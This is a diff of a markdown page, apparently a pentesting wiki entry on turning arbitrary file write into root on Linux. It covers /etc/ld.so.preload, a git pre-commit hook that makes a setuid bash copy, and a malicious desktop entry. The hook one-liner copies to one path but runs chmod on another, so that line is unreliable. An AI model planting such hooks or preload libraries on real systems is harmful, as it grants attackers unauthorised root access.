@@ -1,6 +1,5 @@
 # Arbitrary File Write to Root
 
-
 ### /etc/ld.so.preload
 
 This file behaves like **`LD_PRELOAD`** env variable but it also works in **SUID binaries**.\
@@ -22,10 +21,10 @@ void _init() {
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-```
+
 ### Git hooks
 
-[[https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks|**Git hooks**]] are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) are **scripts** that are **run** on various **events** in a git repository like when a commit is created, a merge... So if a **privileged script or user** is performing this actions frequently and it's possible to **write in the `.git` folder**, this can be used to **privesc**.
 
 For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
 
@@ -33,7 +32,7 @@ For example, It's possible to **generate a script** in a git repo in **`.git/hoo
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-```
+
 ### Cron & Time files
 
 TODO
@@ -56,8 +55,6 @@ Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
 Type=Application
 Name=Evil Desktop Entry
 ```
-```
-For more info check [[https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49|**this post**]] where it was used to exploit a real vulnerability.
 
-
+For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) where it was used to exploit a real vulnerability.
 
